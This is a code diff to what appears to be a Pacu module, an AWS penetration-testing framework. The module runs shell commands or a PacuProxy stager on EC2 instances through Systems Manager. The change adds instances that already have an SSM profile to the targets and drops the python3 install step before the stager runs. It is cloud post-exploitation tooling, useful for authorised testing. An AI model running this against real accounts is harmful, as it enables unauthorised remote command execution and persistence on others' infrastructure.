@@ -305,9 +305,13 @@ def main(args, pacu_main):
                 if instance['Region'] == region:
                     if args.target_instances is not None or args.all_instances is True or instance['ImageId'] in vuln_images:
                         if 'IamInstanceProfile' in instance:
-                            # The instance already has an instance profile attached, skip it if
-                            # args.replace is not True, otherwise add it to instances_to_replace
-                            if args.replace is True and replace is True:
+                            # The instance already has an instance profile attached, add it to
+                            # targets if it is an SSM instance profile, skip it if args.replace
+                            # is not True, otherwise add it to instances_to_replace
+                            if instance['IamInstanceProfile']['Arn'] == ssm_instance_profile_arn:
+                                print('  Instance ID {} already has a Systems Manager instance profile attached to it. Adding to target list...\n'.format(instance['InstanceId']))
+                                targeted_instances.append(instance['InstanceId'])
+                            elif args.replace is True and replace is True:
                                 instances_to_replace.append(instance['InstanceId'])
                             else:
                                 print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
@@ -437,7 +441,7 @@ def main(args, pacu_main):
 
             # Windows
             if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows'):
-                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
+                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
                 if args.command is not None:
                     params = {
                         'commands': [args.command]
@@ -457,14 +461,14 @@ def main(args, pacu_main):
 
             # Linux
             if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'linux'):
-                # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
+                # If a shell command was passed in, run it. Otherwise, try to run a PacuProxy stager
                 if args.command is not None:
                     params = {
                         'commands': [args.command]
                     }
                 else:
                     params = {
-                        'commands': ['yum install python3 -y', 'apt-get install python3 -y', pp_sh_stager]
+                        'commands': [pp_sh_stager]
                     }
                 response = client.send_command(
                     InstanceIds=linux_instances_to_attack,
